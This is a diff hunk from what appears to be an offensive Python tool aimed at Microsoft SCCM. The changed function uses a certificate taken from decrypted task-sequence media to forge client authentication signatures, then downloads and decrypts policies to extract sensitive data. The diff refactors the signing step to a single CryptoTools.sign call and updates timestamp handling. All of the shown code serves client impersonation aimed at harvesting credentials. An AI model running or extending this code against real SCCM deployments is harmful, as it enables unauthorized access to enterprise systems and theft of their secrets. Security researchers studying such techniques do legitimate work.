@@ -564,41 +564,29 @@ def check_clientauthcert(certificate, password):
 
 #Parse the downloaded task sequences and extract sensitive data if present
 def dowload_and_decrypt_policies_using_certificate(guid,cert_bytes):
-    
     smsMediaGuid = guid
-    #CCMClientID header is equal to smsMediaGuid from the decrypted media file
+    # CCMClientID header is equal to smsMediaGuid from the decrypted media file
     CCMClientID = smsMediaGuid
     smsTSMediaPFX = binascii.unhexlify(cert_bytes)
-    
+
     key, cert = load_pfx(smsTSMediaPFX, smsMediaGuid[:31].encode())
     print('[+] Generating Client Authentication headers using PFX File...')
 
     data = CCMClientID.encode("utf-16-le") + b'\x00\x00'
     # CCMClientIDSignature = generateSignedData(data,cryptoProv)
-    try:
-        CCMClientIDSignature = str(generateClientTokenSignature(data, cryptoProv))
-    except:
-        print("[+] Error generating SHA256 CCMClientIDSignature - Trying SHA1...")
-        CCMClientIDSignature = generateSignedData(data, cryptoProv)
+    CCMClientIDSignature = CryptoTools.sign(key, data)
     print("[+] CCMClientID Signature Generated")
 
-    CCMClientTimestamp = datetime.datetime.utcnow().replace(microsecond=0).isoformat() + 'Z'
+    CCMClientTimestamp = datetime.datetime.now(datetime.UTC).replace(microsecond=0).isoformat() + 'Z'
     data = CCMClientTimestamp.encode("utf-16-le") + b'\x00\x00'
     # CCMClientTimestampSignature = generateSignedData(data,cryptoProv)
-    try:
-        CCMClientTimestampSignature = str(generateClientTokenSignature(data, cryptoProv))
-    except:
-        print("[+] Error generating SHA256 CCMClientTimestampSignature - Trying SHA1...")
-        CCMClientTimestampSignature = generateSignedData(data, cryptoProv)
+    CCMClientTimestampSignature = CryptoTools.sign(key, data)
     print("[+] CCMClientTimestamp Signature Generated")
 
-    data = (CCMClientID + ';' + CCMClientTimestamp + "\0").encode("utf-16-le")
+    clientToken = (CCMClientID + ';' + CCMClientTimestamp + "\0").encode("utf-16-le")
     # clientTokenSignature = str(generateSignedData(data,cryptoProv))
-    try:
-        clientTokenSignature = str(generateClientTokenSignature(data, cryptoProv))
-    except:
-        print("[+] Error generating SHA256 clientTokenSignature - Trying SHA1...")
-        clientTokenSignature = str(generateSignedData(data, cryptoProv))
+    clientTokenSignature = CryptoTools.sign(key, clientToken).hex().upper()
+
     print("[+] ClientToken Signature Generated")
     
     try:
